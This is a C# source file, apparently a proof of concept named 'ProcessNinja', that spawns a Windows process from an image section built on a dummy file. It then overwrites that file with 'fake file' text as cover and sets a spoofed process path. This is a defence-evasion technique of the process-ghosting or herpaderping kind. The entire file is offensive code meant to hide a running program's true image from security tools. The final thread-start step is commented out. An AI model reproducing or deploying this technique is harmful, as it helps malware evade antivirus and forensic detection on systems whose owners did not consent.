﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using static ProcessNinja.NativeC;
using static ProcessNinja.Flag;
using static ProcessNinja.Struct;
using static ProcessNinja.Function;



namespace ProcessNinja
{
    class Program
    {
        public static IntPtr FetchPEB(IntPtr hProcess)
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            long pSize;
            ntdll.NtQueryInformationProcess(hProcess, 0x00, out pbi, Marshal.SizeOf(pbi), out pSize);
            byte[] pebBytes = new byte[0x40];
            uint numRead = 0;
            ntdll.NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, pebBytes, (uint)pebBytes.Length, ref numRead);

            GCHandle pPEB = GCHandle.Alloc(pebBytes, GCHandleType.Pinned);
            PEB peb = (PEB)Marshal.PtrToStructure(pPEB.AddrOfPinnedObject(), typeof(PEB));

            return peb.ImageBaseAddress;
        }
        static void Main(string[] args)
        {

            byte[] exeToRun_byte_dummy = new byte[4096];
            IntPtr hSection = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
            IntPtr fptrPeModule = IntPtr.Zero;
            IntPtr fptrPeDataSrc = IntPtr.Zero;
            UInt32 dwRead = 1;
            UInt32 payload_ep = 1;
            UInt32 Zero = 0;
            var natOverlap = new System.Threading.NativeOverlapped();

            String exeToRun = @"C:\Windows\SysWOW64\notepad.exe";
            String fakePath = @"HaHa UCCU!";

            String dummy = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/exeToRun_byte_dummy.txt";

            
            try
            {
                // step 1: open a writable file from NTFS. and create it as an image_section
                fptrPeModule = kernel32.CreateFileW(dummy, EFileAccess.Synchronize | EFileAccess.GenericRead | EFileAccess.GenericWrite, EFileShare.Read | EFileShare.Write, IntPtr.Zero, EFileMode.OpenAlways, 0, IntPtr.Zero);
                fptrPeDataSrc = kernel32.CreateFileW(exeToRun, EFileAccess.GenericRead, 0, IntPtr.Zero, EFileMode.OpenExisting, EFileAttributes.Normal, IntPtr.Zero);

                // step 2: copy file from src to dummy file & create it as a image_section 
                // step 2.1: locate the entry pointer of the PE file
                kernel32.ReadFile(fptrPeDataSrc, exeToRun_byte_dummy, (uint)exeToRun_byte_dummy.Length, out dwRead, IntPtr.Zero);
                PEFile.PEFile pefile = new PEFile.PEFile(exeToRun_byte_dummy);
                var header = pefile.Header;
                //header.IsPE64;
                payload_ep = header.AddressOfEntryPoint;
                kernel32.WriteFile(fptrPeModule, exeToRun_byte_dummy, dwRead, out Zero, ref natOverlap);
                Console.WriteLine("[v] locate entry @ {0:X}", payload_ep);

                //if (NtCreateSection(&hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, fptrPeModule)) return -2;
                if (Convert.ToBoolean(
                        ntdll.NtCreateSection(ref hSection,(uint)ACCESS_MASK.SECTION_ALL_ACCESS,IntPtr.Zero, ref Zero,(uint)AllocationProtect.PAGE_READONLY,(uint)VirtualAllocExTypes.SEC_IMAGE,fptrPeModule)
                        )
                    ) 
                {
                    Console.WriteLine("[v] create section from @ {0}", exeToRun);
                }

                // step 3: create a new process by the image_section
                ntdll.NtCreateProcessEx(ref hProcess,(uint)ProcessAccessTypes.PROCESS_ALL_ACCESS,IntPtr.Zero,Process.GetCurrentProcess().Handle,4,hSection,IntPtr.Zero,IntPtr.Zero,0);
                // step 3.1: locate addr of PEB, and we can check the VAD of main func now
                IntPtr procEntry = (IntPtr)(FetchPEB(hProcess).ToInt64() + payload_ep);
                Console.WriteLine("[v] procEntry ({0:X}) !", procEntry);
                Console.WriteLine("[v] process ({0}) spawned from section!",hProcess);
                
                //Coverfile
                String Writes = string.Concat(Enumerable.Repeat("fake file\n",512));
                kernel32.WriteFile(fptrPeModule, Encoding.ASCII.GetBytes(Writes), (uint)Writes.Length, out Zero, ref natOverlap);

                // step 4: set up process arguments (of PEB) for the child process
                //if (!setup_process_parameters(hProcess, fakePath))
                if (!Convert.ToBoolean(SetupProcessParameters(hProcess, fakePath)))
                {
                    Console.WriteLine("Parameters Setup Failed");
                }
                else
                {
                    Console.WriteLine("Setup parameters for PEB ok.");
                }

                // step 5: finally, create a thread for it. finish :)
                //*(size_t*)&NtCreateThreadEx = (size_t)GetProcAddress(LoadLibraryA("ntdll"), "NtCreateThreadEx");
                //NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, 0, hProcess, (LPTHREAD_START_ROUTINE)procEntry, 0, 0, 0, 0, 0, 0);
                //std::wcout << L"[v] enjoy :)" << std::endl;
                //IntPtr hThread = IntPtr.Zero;
                //uint ntCreate = 0;
                //ntCreate = ntdll.NtCreateThreadEx(ref hThread, (uint)ThreadAccess.THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, procEntry, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                //if (ntCreate == 0)
                //{
                //    Console.WriteLine("[+] NtCreateThreadEx() success!");
                //}
                //else
                //{
                //    Console.WriteLine("[!] NtCreateThreadEx() failed. Exiting.");
                //}
                Console.Read();

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.Read();
            }

        }
    }
}
